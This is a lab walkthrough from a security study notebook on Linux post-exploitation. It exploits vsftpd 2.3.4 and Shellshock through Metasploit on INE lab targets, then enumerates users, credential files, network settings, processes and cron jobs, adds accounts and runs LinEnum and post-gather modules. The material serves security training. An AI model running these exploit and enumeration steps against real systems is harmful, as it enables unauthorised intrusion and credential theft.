# üî¨Linux Post-Exploitation

> üî¨ INE LAB
>
> * Target IP: `192.227.245.3`
> * **Local Linux Enumeration**

> üìùüìå **Always document and save all the Post-Exploitation Local Enumeration in a local file.**

## Enumeration & Exploitation <a href="#enumeration-and-exploitation" id="enumeration-and-exploitation"></a>

```bash
nmap -sV 192.227.245.3
    21/tcp open  ftp     vsftpd 2.3.4vsftpd 2.3.4 - Backdoor Command Execution (Metasploit)                                                                                                                                                                               | exploits/unix/remote/17491.rb
```

```bash
searchsploit vsftpd 2.3.4
    vsftpd 2.3.4 - Backdoor Command Execution (Metasploit)
```

```bash
service postgresql start && msfconsole -q
setg RHOSTS 192.227.245.3
search vsftpd
use exploit/unix/ftp/vsftpd_234_backdoor
setg RHOSTS 192.227.245.3
epxloit
```

<figure><img src="../../../../.gitbook/assets/image (14).png" alt=""><figcaption></figcaption></figure>

```bash
# CTRL+Z
sessions -u 1
sessions 2
	meterpreter >
```

## Local Enumeration <a href="#local-enumeration" id="local-enumeration"></a>

### System Information <a href="#system-information" id="system-information"></a>

* In the **`Meterpreter`** session

<pre class="language-bash"><code class="lang-bash">getuid
<strong>    Server username: uid=0, gid=0, euid=0, egid=0
</strong></code></pre>

```bash
sysinfo
    Computer     : 192.227.245.3
    OS           : Debian 9.5 (Linux 6.8.0-39-generic)
    Architecture : x64
    BuildTuple   : i486-linux-musl
    Meterpreter  : x86/linux
```

```bash
shell
/bin/bash -i
cd /root
```

* In the **`/bin/bash`** session

```bash
hostname
	victim-1
```

```bash
cat /etc/issue
	Debian GNU/Linux 9
	
cat /etc/*release
```

```bash
PRETTY_NAME="Debian GNU/Linux 9 (stretch)"
NAME="Debian GNU/Linux"
VERSION_ID="9"
VERSION="9 (stretch)"
ID=debian
HOME_URL="https://www.debian.org/"
SUPPORT_URL="https://www.debian.org/support"
BUG_REPORT_URL="https://bugs.debian.org/"
```

* Enumerate **kernel**

```bash
uname -a
	Linux victim-1 5.4.0-131-generic #147-Ubuntu SMP Fri Oct 14 17:07:22 UTC 2022 x86_64 GNU/Linux
```

* Enumerate **environment variables** for the current user

```bash
env
```

```bash
LANG=C
USER=root
PWD=/root
HOME=/root
SHLVL=1
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/system/bin:/system/sbin:/system/xbin
_=/usr/bin/env
OLDPWD=/root/vsftpd-2.3.4
```

* Display CPU information

```bash
lscpu
```

```bash
Architecture:          x86_64
CPU op-mode(s):        32-bit, 64-bit
Byte Order:            Little Endian
CPU(s):                48
On-line CPU(s) list:   0-47
Thread(s) per core:    1
Core(s) per socket:    48
Socket(s):             1
NUMA node(s):          1
Vendor ID:             AuthenticAMD
CPU family:            25
Model:                 1
Model name:            AMD EPYC 7713 64-Core Processor
Stepping:              1
CPU MHz:               1999.999
BogoMIPS:              3999.99
Hypervisor vendor:     KVM
Virtualization type:   full
L1d cache:             64K
L1i cache:             64K
L2 cache:              512K
L3 cache:              16384K
NUMA node0 CPU(s):     0-47
Flags:                 fpu vme de pse tsc msr pae mce cx8 apic sep mtrr pge mca cmov pat pse36 clflush mmx fxsr sse sse2 ht syscall nx mmxext fxsr_opt pdpe1gb rdtscp lm rep_good nopl cpuid extd_apicid tsc_known_freq pni pclmulqdq ssse3 fma cx16 pcid sse4_1 sse4_2 x2apic movbe popcnt tsc_deadline_timer aes xsave avx f16c rdrand hypervisor lahf_lm cmp_legacy cr8_legacy abm sse4a misalignsse 3dnowprefetch osvw perfctr_core ssbd ibrs ibpb stibp vmmcall fsgsbase tsc_adjust bmi1 avx2 smep bmi2 erms rdseed adx smap clflushopt clwb sha_ni xsaveopt xsavec xgetbv1 xsaves clzero xsaveerptr wbnoinvd arat umip pku ospke vaes vpclmulqdq rdpid fsrm arch_capabilities
```

* Show **RAM** usage

```bash
free -h
```

* List **storage devices**

```bash
df -h
```

```bash
Filesystem      Size  Used Avail Use% Mounted on
overlay         1.9T  1.6T  170G  91% /
tmpfs            64M     0   64M   0% /dev
shm              64M     0   64M   0% /dev/shm
/dev/sda        1.9T  1.6T  170G  91% /etc/hosts
udev             48G     0   48G   0% /dev/tty
tmpfs            48G     0   48G   0% /proc/acpi
tmpfs            48G     0   48G   0% /proc/scsi
tmpfs            48G     0   48G   0% /sys/firmware
```

```bash
lsblk | grep sd
```

```bash
NAME MAJ:MIN RM  SIZE RO TYPE MOUNTPOINT
sda    8:0    0  1.9T  0 disk /etc/hosts
sdb    8:16   0  512M  0 disk [SWAP]
```

* Enumerate **installed packages**

```bash
# Target is running Debian

dpkg -l
```

```bash
+++-===========-=================-====-==================================================
ii  adduser     3.115             all  add and remove users and groups
ii  apt         1.4.8             i386 commandline package manager
ii  base-files  9.9+deb9u5        i386 Debian base system miscellaneous files
ii  base-passwd 3.5.43            i386 Debian base system master password and group files
ii  bash        4.4-5             i386 GNU Bourne Again SHell
ii  binutils    2.28-5            i386 GNU assembler, linker and binary utilities
ii  bsdutils    1:2.29.2-1+deb9u1 i386 basic utilities from 4.4BSD-Lite
[...]
```

### Users & Groups <a href="#users-and-groups" id="users-and-groups"></a>

```bash
whoami
	root
id
	uid=0(root) gid=0(root) groups=0(root)
# "root" user privileges
```

* _Privilege escalation_ is not necessary in this case.
* Enumerate **users**

```bash
ls -al /home
    total 8
drwxr-xr-x 2 root root 4096 Jun 26  2018 .
drwxr-xr-x 1 root root 4096 Aug  8 06:22 ..
```

```bash
cat /etc/passwd
    root:x:0:0:root:/root:/bin/bash
    daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
    bin:x:2:2:bin:/bin:/usr/sbin/nologin
    sys:x:3:3:sys:/dev:/usr/sbin/nologin
    sync:x:4:65534:sync:/bin:/bin/sync
    games:x:5:60:games:/usr/games:/usr/sbin/nologin
    man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
    lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
    mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
    news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
    uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
    proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
    www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
    backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
    list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
    irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
    gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
    nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
    _apt:x:100:65534::/nonexistent:/bin/false

# Username:x:UserID:GroupID:Description:UserHome:UserShell
# /usr normally is services account
# User and service accounts
```

```bash
cat /etc/passwd | grep -v /nologin
    root:x:0:0:root:/root:/bin/bash
    sync:x:4:65534:sync:/bin:/bin/sync
    _apt:x:100:65534::/nonexistent:/bin/false
    
# -v:  Invert the sense of matching, to select non-matching lines.
```

* Add new user **(Not Recommended)**

```bash
useradd bob -s /bin/bash # /home folder not specified
useradd -m john -s /bin/bash # /home folder is spicified
```

```bash
cat /etc/passwd
    bob:x:1000:1000::/home/bob:/bin/bash
    john:x:1001:1001::/home/john:/bin/bash
```

```bash
ls -al /home
 total 12
 drwxr-xr-x 1 root root 4096 Aug  8 06:59 .
 drwxr-xr-x 1 root root 4096 Aug  8 06:22 ..
 drwxr-xr-x 2 john john 4096 Aug  8 06:59 john
 # Note that bob user is not found in /home because it is not specify when created
```

* Check if a user is part of the `root`/`sudo` group

```bash
groups <USER>
groups root
	root : root
groups
```

* Enumerate **current/recent logged-on users**

```bash
who
w
last
    wtmp begins Tue Aug  6 14:53:21 2024
lastlog
    Username         Port     From             Latest
    root                                       **Never logged in**
    daemon                                     **Never logged in**
    bin                                        **Never logged in**
    sys                                        **Never logged in**
    sync                                       **Never logged in**
    games                                      **Never logged in**
    man                                        **Never logged in**
    lp                                         **Never logged in**
    mail                                       **Never logged in**
    news                                       **Never logged in**
    uucp                                       **Never logged in**
    proxy                                      **Never logged in**
    www-data                                   **Never logged in**
    backup                                     **Never logged in**
    list                                       **Never logged in**
    irc                                        **Never logged in**
    gnats                                      **Never logged in**
    nobody                                     **Never logged in**
    _apt                                       **Never logged in**
```

### Network Information <a href="#network-information" id="network-information"></a>

* Back into the `Meterpreter` session
* Show **network adapter** info

```bash
ifconfig
```

```bash
Interface  1
============
Name         : lo
Hardware MAC : 00:00:00:00:00:00
MTU          : 65536
Flags        : UP,LOOPBACK
IPv4 Address : 127.0.0.1
IPv4 Netmask : 255.0.0.0
IPv6 Address : ::1
IPv6 Netmask : ffff:ffff:ffff:ffff:ffff:ffff::


Interface  2
============
Name         : ip_vti0
Hardware MAC : 00:00:00:00:00:00
MTU          : 1480
Flags        : NOARP


Interface 681
============
Name         : eth0
Hardware MAC : 02:42:c0:e3:f5:03
MTU          : 1500
Flags        : UP,BROADCAST,MULTICAST
IPv4 Address : 192.227.245.3
IPv4 Netmask : 255.255.255.0
```

* Display the **current running TCP/UDP services** `(open ports)`.

```bash
netstat
```

```bash
Connection list
===============

    Proto  Local address        Remote address       State        User   Inode  PID/Program name
    -----  -------------        --------------       -----        ----   -----  ----------------
    tcp    127.0.0.11:38967     0.0.0.0:*            LISTEN       65534  0      
    tcp    0.0.0.0:6200         0.0.0.0:*            LISTEN       0      0      
    tcp    0.0.0.0:21           0.0.0.0:*            LISTEN       0      0      
    tcp    192.227.245.3:6200   192.227.245.2:38351  ESTABLISHED  0      0      
    tcp    192.227.245.3:45924  192.227.245.2:4433   ESTABLISHED  0      0      
    udp    127.0.0.11:50678     0.0.0.0:*                         65534  0 
```

* Display the **routing table** and the **ARP** cache

```bash
route
```

```bash
IPv4 network routes
===================

    Subnet         Netmask        Gateway  Metric  Interface
    ------         -------        -------  ------  ---------
    192.227.245.0  255.255.255.0  0.0.0.0  0       eth0

No IPv6 routes were found.
# Check the gateway
```

```bash
arp
```

```bash
ARP cache
=========

    IP address     MAC address        Interface
    ----------     -----------        ---------
    192.227.245.2  02:42:c0:e3:f5:02  
```

* In the **`/bin/bash`** session

```bash
shell
/bin/bash -i
```

```bash
ifconfig # May not be installed
```

```bash
ip -br -c a
    lo               UNKNOWN        127.0.0.1/8 ::1/128 
    ip_vti0@NONE     DOWN           
    eth0@if682       UP             192.227.245.3/24
```

```bash
ip a s
    1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
        link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
        inet 127.0.0.1/8 scope host lo
           valid_lft forever preferred_lft forever
        inet6 ::1/128 scope host 
           valid_lft forever preferred_lft forever
    2: ip_vti0@NONE: <NOARP> mtu 1480 qdisc noop state DOWN group default qlen 1000
        link/ipip 0.0.0.0 brd 0.0.0.0
    681: eth0@if682: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default 
        link/ether 02:42:c0:e3:f5:03 brd ff:ff:ff:ff:ff:ff link-netnsid 0
        inet 192.227.245.3/24 brd 192.227.245.255 sc
```

* Display the list of network interfaces connected to the target system.

```bash
cat /etc/networks
    default         0.0.0.0
    loopback        127.0.0.0
    link-local      169.254.0.0
```

* List locally **mapped domains**

```bash
cat /etc/hostname
	victim-1
```

```bash
cat /etc/hosts
    127.0.0.1       localhost
    ::1     localhost ip6-localhost ip6-loopback
    fe00::0 ip6-localnet
    ff00::0 ip6-mcastprefix
    ff02::1 ip6-allnodes
    ff02::2 ip6-allrouters
    192.227.245.3   victim-1
```

* Show **default DNS name server**

```bash
cat /etc/resolv.conf
```

```bash
# Generated by Docker Engine.
# This file can be edited; Docker Engine will not make further changes once it
# has been modified.

nameserver 127.0.0.11
search members.linode.com
options edns0 trust-ad ndots:0

# Based on host file: '/etc/resolv.conf' (internal resolver)
# ExtServers: [host(127.0.0.53)]
# Overrides: []
# Option ndots from: internal
```

* Display the `ARP` table

```bash
arp -a
```

### Processes & Cron Jobs <a href="#processes-and-cron-jobs" id="processes-and-cron-jobs"></a>

* Enumerate all **running processes**, from a `Meterpreter` session

```bash
ps
```

```bash
Process List
============

 PID  PPID  Name    Arch    User    Path
 ---  ----  ----    ----    ----    ----
 1    0     sh      x86     root    /bin
 7    1     vsftpd  x86     root    /usr/local/sbin
 10   7     sh      x86     root    /bin
 11   10    vsftpd  x86_64  nobody  .
 20   10    gpSsX   x86_64  root    /tmp
```

```bash
pgrep vsftpd
    7
    11
```

* In the **`/bin/bash`** session
* List **running processes** _(on the Kali Linux if the target machine does not have to commands)_

```
msf5 > ps
    PID TTY          TIME CMD
     23 pts/0    00:00:00 bash
     25 pts/0    00:00:12 ruby
    262 pts/0    00:00:00 ps
```

<pre><code><strong>msf5 > ps aux
</strong></code></pre>

```
USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root           1  0.0  0.0   2384   756 ?        Ss   19:40   0:00 /bin/sh /startup.sh
root          19  0.1  0.0 114224 21384 ?        Sl   19:40   0:03 /usr/local/bin/ttyd -p 45654 bash
root          23  0.0  0.0   3812  3156 pts/0    Ss   19:41   0:00 bash
root          25  0.4  0.2 1139064 226336 pts/0  Sl+  19:41   0:12 ruby /usr/bin/msfconsole -q
root         270  0.0  0.0   7636  2712 pts/0    R+   20:25   0:00 ps aux
```

```
ps aux | grep msfconsole
ps aux | grep root
```

* Dynamic check of running processes

<pre><code><strong>msf5 > top
</strong></code></pre>

<figure><img src="https://blog.syselement.com/~gitbook/image?url=https%3A%2F%2F1996978447-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FlhjuckuLbvBn36EoFL7P%252Fuploads%252Fgit-blob-efc606240603677ecbe422ce5505bc1376b82969%252Fimage-20230427222932918.png%3Falt%3Dmedia&#x26;width=768&#x26;dpr=4&#x26;quality=100&#x26;sign=e0a070c3&#x26;sv=1" alt=""><figcaption></figcaption></figure>

* List the **cron jobs**

> üìå Scheduled cron jobs can be misconfigured and vulnerable to **exploitation** and **privilege escalation**!

```
msf5 > cat /etc/cron*
```

```
cat: /etc/cron.d: Is a directory
cat: /etc/cron.daily: Is a directory
cat: /etc/cron.hourly: Is a directory
cat: /etc/cron.monthly: Is a directory
cat: /etc/cron.weekly: Is a directory
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# Example of job definition:
# .---------------- minute (0 - 59)
# |  .------------- hour (0 - 23)
# |  |  .---------- day of month (1 - 31)
# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
# |  |  |  |  |
# *  *  *  *  * user-name command to be executed
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
```

* Show cron jobs for the current user

```
msf5 > crontab -l
```

## Automating Local Enum <a href="#automating-local-enum" id="automating-local-enum"></a>

> üî¨ INE LAB
>
> * Target IP: `192.191.69.3`
> * Automation Tools:
>   * [LinEnum - rebootuser](https://github.com/rebootuser/LinEnum)
>   * Metasploit Framework

**`LinEnum`** - bash script that _automates common Linux local enumeration_

```
./LinEnum.sh -s -k keyword -r report -e /tmp/ -t
```

### Enumeration & Exploitation <a href="#enumeration-and-exploitation-1" id="enumeration-and-exploitation-1"></a>

```bash
# Target Apache/ShellShock vuln
nmap -sV 192.191.69.3
	80/tcp open  http  Apache httpd 2.4.6 ((Unix))
```

```bash
service postgresql start && msfconsole -q
search shellshock
use exploit/multi/http/apache_mod_cgi_bash_env_exec
setg RHOSTS 192.191.69.3
set TARGETURI /gettime.cgi
run
```

```bash
sysinfo
    Computer     : 192.191.69.3
    OS           : Ubuntu 14.04 (Linux 6.8.0-39-generic)
    Architecture : x64
    BuildTuple   : i486-linux-musl
    Meterpreter  : x86/linux
    
getuid
    Server username: uid=1, gid=1, euid=1, egid=1
```

### Metasploit Post-Exploitation <a href="#metasploit-post-exploitation" id="metasploit-post-exploitation"></a>

```
background
```

* Enumerate **configuration files**

```bash
use post/linux/gather/enum_configs
set SESSION 1
run
```

<figure><img src="../../../../.gitbook/assets/image (1) (1).png" alt=""><figcaption></figcaption></figure>

* Enumerate **network info**

```bash
use post/linux/gather/enum_network
set SESSION 1
run
```

<figure><img src="../../../../.gitbook/assets/image (2) (1).png" alt=""><figcaption></figcaption></figure>

* Enumerate **local system information**

```bash
use post/linux/gather/enum_system
set SESSION 1
run
```

<figure><img src="../../../../.gitbook/assets/image (3) (1).png" alt=""><figcaption></figcaption></figure>

* Check if the target is a **VM or a container**

```bash
use post/linux/gather/checkvm
set SESSION 1
run
```

<figure><img src="https://blog.syselement.com/~gitbook/image?url=https%3A%2F%2F1996978447-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FlhjuckuLbvBn36EoFL7P%252Fuploads%252Fgit-blob-a0d97449c8a3a93a36104ca6780e90c03a8303e1%252Fimage-20230427225015650.png%3Falt%3Dmedia&#x26;width=768&#x26;dpr=4&#x26;quality=100&#x26;sign=53ae1479&#x26;sv=1" alt=""><figcaption></figcaption></figure>

### LinEnum <a href="#linenum" id="linenum"></a>

* Copy the content of the [LinEnum.sh](https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh) script and save it in the lab environment
* Back into the `Meterpreter` session, copy the **`LinEnum.sh`** file into the `/tmp` target directory

<figure><img src="../../../../.gitbook/assets/image (4) (1).png" alt=""><figcaption></figcaption></figure>

```bash
session 1
cd /tmp
upload /root/Desktop/LinEnum.sh
shell
/bin/bash -i

id
	uid=1(daemon) gid=1(daemon) groups=1(daemon)
```

<figure><img src="../../../../.gitbook/assets/image (5) (1).png" alt=""><figcaption></figcaption></figure>

* Run **`LinEnum.sh`** and output the results in a file

```bash
chmod +x LinEnum.sh
./LinEnum.sh

# Copy the output to a txt local file
```

<figure><img src="../../../../.gitbook/assets/image (6) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../../.gitbook/assets/image (7) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../../.gitbook/assets/image (8) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../../.gitbook/assets/image (9) (1).png" alt=""><figcaption></figcaption></figure>
